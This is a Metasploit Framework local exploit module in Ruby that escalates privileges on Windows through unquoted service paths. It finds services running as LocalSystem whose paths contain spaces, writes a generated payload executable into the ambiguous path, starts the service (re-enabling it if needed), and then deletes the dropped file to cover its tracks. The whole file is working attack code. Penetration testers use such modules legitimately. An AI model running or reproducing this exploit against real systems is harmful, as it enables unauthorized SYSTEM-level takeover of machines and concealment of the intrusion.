##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::Common
	include Msf::Post::File
	include Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'           => 'Windows Service Trusted Path Privilege Escalation',
			'Description'    => %q{
				This module exploits a logic flaw due to how the lpApplicationName parameter
				is handled.  When the lpApplicationName contains a space, the file name is
				ambiguous.  Take this file path as example: C:\program files\hello.exe;
				The Windows API will try to interpret this as two possible paths:
				C:\program.exe, and C:\program files\hello.exe, and then execute all of them.
				To some software developers, this is an unexpected behavior, which becomes a
				security problem if an attacker is able to place a malicious executable in one
				of these unexpected paths, sometimes escalate privileges if run as SYSTEM.
				Some softwares such as OpenVPN 2.1.1, or OpenSSH Server 5, etc... all have the
				same problem.
			},
			'References'     =>
				[
					['URL', 'http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx']
				],
			'DisclosureDate' => "Oct 25 2001",
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'sinn3r'
				],
			'Platform'       => [ 'win'],
			'Targets'        => [ ['Windows', {}] ],
			'SessionTypes'   => [ "shell", "meterpreter" ],
			'DefaultTarget'  => 0,
			# Migrate away, in case the service dies (can kill access)
			'DefaultOptions' => { 'InitialAutoRunScript' => 'migrate -f' }
		))
	end


	def check
		if enum_vuln_services.empty?
			return Exploit::CheckCode::Safe
		else
			return Exploit::CheckCode::Vulnerable
		end
	end


	def enum_vuln_services(quick=false)
		vuln_services = []

		service_list.each do |name|
			info = service_info(name)

			# Sometimes there's a null byte at the end of the string,
			# and that can break the regex -- annoying.
			cmd = info['Command'].strip

			# Check path:
			# - Filter out paths that begin with a quote
			# - Filter out paths that don't have a space
			next if cmd !~ /^[a-z]\:.+\.exe$/i
			next if not cmd.split("\\").map {|p| true if p =~ / /}.include?(true)

			# Filter out services that aren't launched as SYSTEM
			next if info['Credentials'] !~ /LocalSystem/

			vprint_status("Found vulnerable service: #{name} - #{cmd} (#{info['Credentials']})")
			vuln_services << [name, cmd]

			# This process can be pretty damn slow.
			# Allow the user to just find one, and get the hell out.
			break if not vuln_services.empty? and quick
		end

		return vuln_services
	end


	def exploit
		#
		# Exploit the first service found
		#
		print_status("Finding a vulnerable service...")
		svrs = enum_vuln_services(true)
		if svrs.empty?
			print_error("No service found with trusted path issues")
			return
		end

		svr_name = svrs.first[0]
		fpath    = svrs.first[1]
		exe_path = "#{fpath.split(' ')[0]}.exe"
		print_status("Placing #{exe_path} as #{svr_name}")


		#
		# Drop the malicious executable into the path
		#
		exe = generate_payload_exe
		print_status("Writing #{exe.length.to_s} bytes to #{exe_path}...")
		begin
			write_file(exe_path, exe)
		rescue Rex::Post::Meterpreter::RequestError => e
			# Can't write the file, can't go on
			print_error(e.message)
			return
		end


		#
		# Run the service, let the Windows API do the rest
		#
		print_status("Launching service #{svr_name}...")
		tried = false
		begin
			status = service_start(svr_name)
			raise RuntimeError, status if status != 0
		rescue RuntimeError => s
			if tried
				print_error("Unable to start #{svr_name}")
				return
			else
				tried = true	
			end

			case s.message
			when 1
				# Service already started, restart again
				service_stop(svr_name)
				retry
			when 2
				# Service disabled, enable it
				service_change_startup(svr_name, 'manual')
				retry
			end
		end


		#
		# "Nothing ever happened, we swears it on the Precious!"
		#
		print_status("Deleting #{exe_path}")
		begin
			cmd_exec("cmd /c del \"#{exe_path}\"")
		rescue ::Exception => e
			print_error("Unable to remove #{exe_path}: #{e.message}")
		end
	end

end
